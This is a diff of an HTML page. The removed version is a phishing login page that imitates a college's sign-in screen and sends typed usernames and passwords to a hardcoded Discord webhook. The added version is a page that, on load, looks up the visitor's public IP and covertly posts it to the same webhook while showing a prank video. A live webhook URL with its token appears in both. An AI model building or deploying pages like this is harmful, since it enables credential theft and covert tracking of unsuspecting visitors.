@@ -2,94 +2,48 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>SECE Login</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f0f0f0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .login-box {
-      background: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
-      text-align: center;
-      width: 350px;
-      animation: fadeIn 1s ease;
-    }
-    .login-box img {
-      width: 180px;
-      margin-bottom: 20px;
-    }
-    .login-box h2 {
-      margin-bottom: 20px;
-    }
-    input[type="text"], input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #007bff;
-      border: none;
-      color: #fff;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #0056b3;
-    }
-    @keyframes fadeIn {
-      from {opacity: 0; transform: translateY(20px);}
-      to {opacity: 1; transform: translateY(0);}
-    }
-  </style>
+  <title>IP Demo with Discord Webhook</title>
 </head>
-<body>
+<body style="text-align: center; font-family: Arial, sans-serif; padding: 20px;">
 
-  <div class="login-box">
-    <img src="https://sece.ac.in/wp-content/uploads/2024/05/clg-logo2-1024x292.webp" alt="SECE Logo">
-    <h2>Login</h2>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Username" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button type="submit">Login</button>
-    </form>
-  </div>
+  <h2>Your Public IP Address is:</h2>
+  <p id="ip">Loading...</p>
+
+  <h3>Enjoy this meme while you're here 😎</h3>
+  <video width="480" controls autoplay muted loop>
+    <source src="https://media.githubusercontent.com/media/AnIdiotsGuide/website-assets/master/videos/rickroll.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1390268292500820030/bF7_FAN1_YyvGPeLZuhE3TIDSVFIxg0ky0OxRveEVP_8ERIefeUtWRa_GZfj8m7XqhXC";
+    // Replace this with your actual Discord webhook URL
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1390268292500820030/bF7_FAN1_YyvGPeLZuhE3TIDSVFIxg0ky0OxRveEVP_8ERIefeUtWRa_GZfj8m7XqhXC';
 
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        document.getElementById('ip').textContent = ip;
+        console.log("IP Address:", ip);
 
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          content: `👤 **New Login Attempt**\n**Username**: ${username}\n**Password**: ${password}`
-        })
-      }).then(() => {
-        alert("Login data sent to Discord!");
-        document.getElementById("loginForm").reset();
-      }).catch(() => {
-        alert("Failed to send data.");
+        // Send to Discord webhook
+        fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            content: `🌐 New IP visitor: ${ip}`
+          })
+        });
+      })
+      .catch(error => {
+        document.getElementById('ip').textContent = "Could not get IP.";
+        console.error("Error fetching IP:", error);
       });
-    });
   </script>
 
 </body>
 </html>
+
+ 
